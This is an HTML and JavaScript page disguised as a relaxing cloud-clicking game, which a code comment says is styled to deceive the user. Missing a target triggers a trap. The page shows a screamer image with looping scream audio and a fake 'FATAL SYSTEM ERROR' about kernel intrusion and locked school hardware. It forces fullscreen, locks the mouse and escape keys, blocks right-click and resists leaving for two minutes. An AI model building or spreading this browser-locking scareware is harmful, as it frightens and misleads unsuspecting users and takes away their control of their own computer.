<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sky Collect - Relaxing Game</title>
    <style>
        /* Estilos visuales bonitos para engañar al usuario */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            overflow: hidden; font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #a8edea 0%, #fed6e3 100%);
            display: flex; justify-content: center; align-items: center;
        }

        #ui-layer {
            position: absolute; top: 20px; text-align: center;
            color: #555; font-size: 24px; font-weight: bold; z-index: 5;
        }

        .target {
            position: absolute; width: 60px; height: 60px;
            background: white; border-radius: 50%;
            box-shadow: 0 0 20px rgba(255,255,255,0.8);
            cursor: pointer; transition: transform 0.1s;
            display: flex; justify-content: center; align-items: center;
            font-size: 30px;
        }

        /* CAPA DEL SUSTO Y BLOQUEO */
        #bloqueo-total {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: #000; display: none; z-index: 99999;
            flex-direction: column; justify-content: center; align-items: center;
            cursor: none;
        }

        #screamer-img {
            width: 100%; height: 100%; object-fit: cover;
            filter: contrast(1.5) brightness(0.8);
        }

        #msg-error {
            position: absolute; bottom: 10%; color: #ff0000;
            font-family: 'Courier New', monospace; text-align: center;
            background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid red;
        }

        #btn-start {
            padding: 20px 50px; font-size: 28px; border: none;
            border-radius: 15px; background: #fff; cursor: pointer;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1); color: #ff8fb1;
            font-weight: bold; transition: 0.3s;
        }

        #btn-start:hover { transform: scale(1.1); background: #fff0f5; }
    </style>
</head>
<body>

    <div id="ui-layer">Puntos: <span id="score">0</span></div>
    <button id="btn-start" onclick="iniciar()">JUGAR</button>

    <div id="bloqueo-total">
        <img id="screamer-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6A7T-Y-M3-4Mh4f1uU8h88N7W2A2m8v3Q6A&s" alt="FATAL_ERROR">
        
        <div id="msg-error">
            <h2 style="margin:0">FATAL SYSTEM ERROR 0x000412</h2>
            <p>Se ha detectado una intrusión en el kernel del sistema.<br>
            Hardware bloqueado para protección de datos escolares.<br>
            REINSTALANDO SEGURIDAD: <span id="percent">0</span>%</p>
            <p style="font-size: 12px; color: #555;">No intente apagar el equipo o perderá la garantía del administrador.</p>
        </div>

        <audio id="audio-susto" loop>
            <source src="https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Scream&filename=24/243677-43093952-6712-4014-9904-877232230784.mp3" type="audio/mpeg">
        </audio>
    </div>

    <script>
        let puntos = 0;
        let activo = false;

        function iniciar() {
            document.getElementById('btn-start').style.display = 'none';
            activo = true;
            
            // Entrar en pantalla completa (Requisito para el bloqueo posterior)
            let elem = document.documentElement;
            if (elem.requestFullscreen) { elem.requestFullscreen(); }
            
            aparecerObjetivo();
        }

        function aparecerObjetivo() {
            if (!activo) return;
            const target = document.createElement('div');
            target.className = 'target';
            target.innerHTML = '☁️';
            target.style.left = Math.random() * (window.innerWidth - 80) + 'px';
            target.style.top = Math.random() * (window.innerHeight - 80) + 'px';

            // Tiempo límite para picar (si no, sale el susto)
            const castigo = setTimeout(ejecutarTrampa, 1200);

            target.onclick = () => {
                clearTimeout(castigo);
                puntos++;
                document.getElementById('score').innerText = puntos;
                target.remove();
                aparecerObjetivo();
            };
            document.body.appendChild(target);
        }

        function ejecutarTrampa() {
            activo = false;
            const pantalla = document.getElementById('bloqueo-total');
            const audio = document.getElementById('audio-susto');
            
            pantalla.style.display = 'flex';
            audio.play();

            // BLOQUEO DE TECLADO Y MOUSE
            document.documentElement.requestPointerLock(); // Atrapa el mouse
            
            if (navigator.keyboard && navigator.keyboard.lock) {
                // Bloquea teclas de escape y navegación
                navigator.keyboard.lock(["Escape", "Tab", "MetaLeft", "MetaRight", "AltLeft"]);
            }

            // Evitar que usen el clic derecho para inspeccionar o cerrar
            document.addEventListener('contextmenu', e => e.preventDefault());

            // Temporizador de "Prisión" de 2 minutos (120 segundos)
            let carga = 0;
            const temp = setInterval(() => {
                carga += 0.833; // 100 / 120 segundos
                document.getElementById('percent').innerText = Math.floor(carga);
                
                if (carga >= 100) {
                    clearInterval(temp);
                    // Solo después de 2 minutos se libera o recarga
                    window.location.reload();
                }
            }, 1000);

            // Si intentan recargar con F5 o salir (en algunos navegadores)
            window.onbeforeunload = function() {
                return "El sistema está reparándose, no puedes salir ahora.";
            };
        }

        // Si se sale de pantalla completa por error, lo forzamos a volver antes del susto
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && activo) {
                iniciar();
            }
        });
    </script>
</body>
</html>
